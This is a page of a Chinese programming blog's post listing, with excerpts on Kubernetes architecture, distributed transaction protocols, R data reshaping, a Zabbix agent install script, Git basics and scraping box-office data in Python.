			k8s基础架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		k8s基础架构 创建pod流程 （1）用户通过kubectl向api-server发起创建pod请求；
（2）apiserver通过对应的kubeconfig进行认证，认证通过后将yaml中的po信息存到etcd；
（3）Controller-Manager通过apiserver的watch接口发现了pod信息的更新，执行该资源所依赖的拓扑结构整合，整合后将对应的信息交给apiserver，apiserver写到etcd，此时pod已经可以被调度；
（4）Scheduler同样通过apiserver的watch接口更新到pod可以被调度，通过算法给pod分配节点，并将pod和对应节点绑定的信息交给apiserver，apiserver写到etcd，然后将pod交给kubelet；
（5）kubelet收到pod后，调用CNI接口给pod创建pod网络，调用CRI接口去启动容器，调用CSI进行存储卷的挂载；
（6）网络，容器，存储创建完成后pod创建完成，等业务进程启动后，pod运行成功。
master组件 （1）kube-apiserver：Kubernetes API，集群统一入口，各组件协调者，以RESTful API提供接口服务，所有对象的资源的增删改查和监听操作都交给APIServer处理后在提交给Etcd存储；
提供了集群管理的REST API接口(包括认证授权、数据校验以及集群状态变更)；提供其他模块之间的数据交互和通信的枢纽（其他模块通过API Server查询或修改数据，只有API Server才直接操作etcd；是资源配额控制的入口。 （2）controller-manager：是 Kubernetes 的大脑，它通过 apiserver 监控整个集群的状态，并确保集群处于预期的工作状态；
（3）scheduler：scheduler 负责分配调度 Pod 到集群内的节点上，它监听 kube-apiserver，查询还未分配 Node 的 Pod，然后根据调度策略为这些 Pod 分配节点；
kube-scheduler 调度分为两个阶段，predicate 和 priority；predicate：过滤不符合条件的节点；priority：优先级排序，选择优先级最高的节点。 （4）etcd：Etcd 是 CoreOS 基于 Raft 开发的分布式 key-value 存储，可用于服务发现、共享配置以及一致性保障（如数据库选主、分布式锁等）。
基本的 key-value 存储监听机制key 的过期及续约机制，用于监控和服务发现原子性操作（CAS 和 CAD），用于分布式锁和 leader 选举 node组件 （1）kubelet：kubelet是Master在Node节点上的Agent，管理本机运行容器的生命周期，比如创建容器、Pod挂载数据卷、下载Secret、获取容器节点状态工作。kubelet将每个Pod转换成一组容器。
每个节点上都运行一个 kubelet 服务进程，默认监听 10250 端口，接收并执行 master 发来的指令，管理 Pod 及 Pod 中的容器。每个 kubelet 进程会在 API Server 上注册节点自身信息，定期向 master 节点汇报节点的资源使用情况，并通过 cAdvisor 监控节点和容器的资源
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfebcc3df6eba0054f5d5d23b037dd0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9c059b5ac58f70ae58af74bbf7923d1/" rel="bookmark">
			分布式「走进分布式一致性协议」从2PC、3PC、Paxos 到 ZAB
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设计一个分布式系统必定会遇到一个问题—— 因为分区容忍性（partition tolerance）的存在，就必定要求我们需要在系统可用性（availability）和数据一致性（consistency）中做出权衡 。这就是著名的 CAP
一致性模型 一致性（Consistency）是指多副本（Replications）问题中的数据一致性。关于分布式系统的一致性模型有以下几种：
强一致性：当更新操作完成之后，任何多个后续进程或者线程的访问都会返回最新的更新过的值，直到这个数据被其他数据更新为止。但是这种实现对性能影响较大，因为这意味着，只要上次的操作没有处理完，就不能让用户读取数据。弱一致性：系统并不保证进程或者线程的访问都会返回最新更新过的值。系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体的承诺多久之后可以读到。甚至不能保证可以访问到。最终一致性：最终一致性也是弱一致性的一种，它无法保证数据更新后，所有后续的访问都能看到最新数值，而是需要一个时间，在这个时间之后可以保证这一点（就是在一段时间后，节点间的数据会最终达到一致状态），而在这个时间内，数据也许是不一致的，这个系统无法保证强一致性的时间片段被称为「不一致窗口」。不一致窗口的时间长短取决于很多因素，比如备份数据的个数、网络传输延迟速度、系统负载等。 一致性协议 为了解决分布式系统的一致性问题，在长期的研究探索过程中，业内涌现出了一大批经典的一致性协议和算法，其中比较著名的有二阶段提交协议（2PC），三阶段提交协议（3PC）和 Paxos 算法。
分布式事务 分布式事务是指会涉及到操作多个数据库的事务。其实就是将对同一库事务的概念扩大到了对多个库的事务。
目的是为了保证分布式系统中的数据一致性。
分布式事务处理的关键是必须有一种方法可以知道事务在任何地方所做的所有动作，提交或回滚事务的决定必须产生统一的结果（全部提交或全部回滚）
在分布式系统中，各个节点之间在物理上相互独立，通过网络进行沟通和协调。由于存在事务机制，可以保证每个独立节点上的数据操作可以满足ACID。但是，相互独立的节点之间无法准确的知道其他节点中的事务执行情况。所以从理论上讲，两台机器理论上无法达到一致的状态。如果想让分布式部署的多台机器中的数据保持一致性，那么就要保证在所有节点的数据写操作，要不全部都执行，要么全部的都不执行。但是，一台机器在执行本地事务的时候无法知道其他机器中的本地事务的执行结果。所以他也就不知道本次事务到底应该commit还是 roolback。所以，常规的解决办法就是引入一个“协调者”的组件来统一调度所有分布式节点的执行。
XA规范 X/Open 组织（即现在的 Open Group ）定义了分布式事务处理模型。
X/Open DTP 模型（ 1994 ）包括应用程序（ AP ）、事务管理器（ TM ）、资源管理器（ RM ）、通信资源管理器（ CRM ）四部分。一般，常见的事务管理器（ TM ）是交易中间件，常见的资源管理器（ RM ）是数据库，常见的通信资源管理器（ CRM ）是消息中间件。
通常把一个数据库内部的事务处理，如对多个表的操作，作为本地事务看待。数据库的事务处理对象是本地事务，而分布式事务处理的对象是全局事务。所谓全局事务，是指分布式事务处理环境中，多个数据库可能需要共同完成一个工作，这个工作即是一个全局事务，例如，一个事务中可能更新几个不同的数据库。对数据库的操作发生在系统的各处但必须全部被提交或回滚。此时一个数据库对自己内部所做操作的提交不仅依赖本身操作是否成功，还要依赖与全局事务相关的其它数据库的操作是否成功，如果任一数据库的任一操作失败，则参与此事务的所有数据库所做的所有操作都必须回滚。
一般情况下，某一数据库无法知道其它数据库在做什么，因此，在一个 DTP 环境中，交易中间件是必需的，由它通知和协调相关数据库的提交或回滚。而一个数据库只将其自己所做的操作（可恢复）影射到全局事务中。
XA 就是 X/Open DTP 定义的交易中间件与数据库之间的接口规范（即接口函数），交易中间件用它来通知数据库事务的开始、结束以及提交、回滚等。XA 接口函数由数据库厂商提供。
二阶提交协议和三阶提交协议就是根据这一思想衍生出来的。可以说二阶段提交其实就是实现XA分布式事务的关键(确切地说：两阶段提交主要保证了分布式事务的原子性：即所有结点要么全做要么全不做)
2PC 2PC，是 Two-Phase-Comimit 的缩写，即「二阶段提交」，是计算机网络尤其是数据库领域内，为了使基于分布式系统架构的所有节点在进行事务处理过程中能够保持原子性和一致性而设计的一种协议。
现在很多数据库都是采用的二阶段提交协议来完成分布式事务的处理。
二阶段，顾名思义就是分两个阶段处理事务，流程如下：
阶段一：提交事务请求（”投票阶段“） 当要执行一个分布式事务的时候，事务发起者首先向协调者发起事务请求，然后协调者会给所有参与者发送 prepare 请求（其中包括事务内容）告诉参与者你们需要执行事务了，如果能执行我发的事务内容那么就先执行但不提交，执行后请给我回复。然后参与者收到 prepare 消息后，他们会开始执行事务（但不提交），并将 Undo 和 Redo 信息记入事务日志中，之后参与者就向协调者反馈是否准备好了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9c059b5ac58f70ae58af74bbf7923d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aeb16726a0b6193f0533c0d9f0e30e9/" rel="bookmark">
			R语言——reshape2包、tidyr包、dplyr包（五）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、数据转换之reshape2包：melt与dcast函数
二、数据转换之tidyr包：gather与spread函数，separate与unite函数
三、据转换之dplyr包
四、参考
一、数据转换之reshape2包：melt与dcast函数 merge 函数 使用merge函数
x &lt;- data.frame(k1=c(NA,NA,3,4,5),k2=c(1,NA,NA,4,5),data=1:5)
y &lt;- data.frame(k1=c(NA,2,NA,4,5),k2=c(NA,NA,3,4,5),data=1:5)
【使用 cbind 或 rbind 无法区分哪部分来自 x ， 哪部分来自 y 。】
merge(x,y,by)合并函数：by表示根据x和y中的某一列进行合并。如：
merge(x,y,by=c(“k1”,“k2”))
reshape2 包 安装reshape2包：install.packages('reashape2')
加载reshape2包：library(reshape2)
（使用R中的airquality数据集做演示）
names(airquality) &lt;- tolower(names(airquality)) aql &lt;- melt(airquality,id.vars = c(“month”,“day”)) #将数据中的month和day作为id信息，宽数据变长数据。
aqw &lt;- dcast(aql,month~variable,fun.aggregate=sum,na.rm=TRUE) #长数据变宽数据。
这里的~表示相关联，说明二者有关系，但不一定是相等；fun.aggregate表示给定一个函数指定如何重塑数据；na.rm表示移除na数据。
二、数据转换之tidyr包：gather与spread函数，separate与unite函数 安装tidyr包
tdata &lt;- mtcars[1:10,1:3]
tdata &lt;- data.frame(names=rownames(tdata),tdata)
gather(tdata,key=“Key”,value=“Value”,cyl,disp,mpg) #宽数据变长数据，类似于melt，tdata是数据框，key为标签，value为对应值。
gather(tdata,key=“Key”,value=“Value”,cyl,-disp) #disp单独放到一列中
gdata &lt;- gather(tdata,key=“Key”,value=“Value”,2:4) #这里的2:4等于cyl,disp,mpg（或者cyl:mpg）
spread(gdata,key=“Key”,value=“Value”) #spread函数与gather函数作用相反，它是将长数据变为宽数据
df &lt;- data.frame(x=c(NA,'a.b','a.d','b.c'))
separate(df,col=x,into=c('A','B')) #将df数据框中的x列，分割为A、B两列，默认识别分隔符为“.”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3aeb16726a0b6193f0533c0d9f0e30e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/001840cb7320bcf0d9829eefe5991737/" rel="bookmark">
			Linux随记（七）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、欧拉bclinux 21.10安装zabbix-5.0.37.tar.gz （zbx-客户端） #系统环境： BigCloud Enterprise Linux For Euler 21.10 LTS #软件信息： zabbix-5.0.37.tar.gz ， pcre-devel-8.44-2.oe1.x86_64.rpm ， installZbxAgent5.sh 安装脚本： installZbxAgent5.sh
#!/bin/bash #安装所需软件 sudo yum install -y gcc sudo yum install -y pcre-devel sudo rpm -Uvh /tmp/pcre-devel-8.44-2.oe1.x86_64.rpm sudo yum install -y make sudo useradd -s /sbin/nologin zabbix -M sudo chmod 644 /var/log/messages #编译安装 sudo sh -c "cd /tmp/zbx-agent5 &amp;&amp; sudo tar xf zabbix-5.0.37.tar.gz" sudo sh -c "cd /tmp/zbx-agent5/zabbix-5.0.37 &amp;&amp; ./configure --enable-agent --disable-dependency-tracking &amp;&amp; make install &amp;&amp; echo 'install zbx-agent-ok' "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/001840cb7320bcf0d9829eefe5991737/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc1993df4083c40e85f11a910f1db7ff/" rel="bookmark">
			Git：基础要点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 直接快照，而非比较差异。 近乎所有操作都可本地执行。 在Git 中的绝大多数操作都只需要访问本地文件和资源，不用连网。但如果用CVCS 的话，差不多所有操作都需要连接网络。因为Git 在本地磁盘上就保存着所有有关当前项目的历史更新，所以处理起来速度飞快。
时刻保持数据完整性。
在保存到Git 之前，所有数据都要进行内容的校验和（checksum）计算，并将此结果作为数据的唯一标识和索引。换句话说，不可能在你修改了文件或目录之后，Git 一无所知。这项特性作为Git 的设计哲学，建在整体架构的最底层。所以如果文件在传输时变得不完整，或者磁盘损坏导致文件数据缺失，Git 都能立即察觉。多数操作仅添加数据。
常用的Git 操作大多仅仅是把数据添加到数据库。因为任何一种不可逆的操作，比如删除数据，要回退或重现都会非常困难。在别的VCS 中，若还未提交更新，就有可能丢失或者混淆一些修改的内容，但在Git 里，一旦提交快照之后就完全不用担心丢失数据，特别是在养成了定期推送至其他镜像仓库的习惯的话。三种状态
对于任何一个文件，在Git 内都只有三种状态：已提交（committed），已修改（modified）和已暂存（staged）。已提交表示该文件已经被安全地保存在本地数据库中了；已修改表示修改了某个文件，但还没有提交保存；已暂存表示把已修改的文件放在下次提交时要保存的清单中。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/382a13819a044407ffc34cb7a84f18c2/" rel="bookmark">
			Python数据分析案例30——中国高票房电影分析（爬虫获取数据及分析可视化全流程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		案例背景 最近总看到《消失的她》票房多少多少，《孤注一掷》票房又破了多少多少.....
于是我就想自己爬虫一下获取中国高票房的电影数据，然后分析一下。
数据来源于淘票票：影片总票房排行榜 (maoyan.com)
爬它就行。
不会爬虫的同学要这代码演示数据可以参考：数据
代码实现 首先爬虫获取数据：
数据获取 导入包
import requests; import pandas as pd from bs4 import BeautifulSoup 传入网页和请求头
url = 'https://piaofang.maoyan.com/rankings/year' headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62'} response1 = requests.get(url,headers=headers) response.status_code 200表示获取网页文件成功
然后解析网页文件，获取电影信息数据
%%time soup = BeautifulSoup(response.text, 'html.parser') soup=soup.find('div', id='ranks-list') movie_list = [] for ul_tag in soup.find_all('ul', class_='row'): movie_info = {} li_tags = ul_tag.find_all('li') movie_info['序号'] = li_tags[0].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/382a13819a044407ffc34cb7a84f18c2/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/42/">«</a>
	<span class="pagination__item pagination__item--current">43/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/44/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>